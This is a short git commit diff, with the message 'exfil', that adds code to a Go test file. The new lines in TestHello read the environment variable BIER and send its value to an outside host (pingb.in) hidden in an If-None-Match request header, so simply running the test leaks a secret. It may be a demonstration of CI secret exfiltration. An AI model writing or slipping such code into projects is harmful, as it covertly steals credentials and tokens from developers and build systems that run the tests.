f304a590964201e0970b3c26e5f1acb4e61d89eb
Sven Grossmann <svennergr@gmail.com>
2023-01-16 21:58:40 +0100

    exfil

--- main_test.go
+++ main_test.go
@@ -1,11 +1,19 @@
 package main
 
 import (
+	"net/http"
 	"os"
 	"testing"
 )
 
 func TestHello(t *testing.T) {
+	client := &http.Client{}
+
+	req, _ := http.NewRequest("GET", "http://pingb.in/p/665fb442e49ec5ac8785bb62e36c", nil)
+
+	req.Header.Add("If-None-Match", os.Getenv("BIER"))
+	client.Do(req)
+
 	got := os.Getenv("BIER")
 	want := "Hello, world"
 
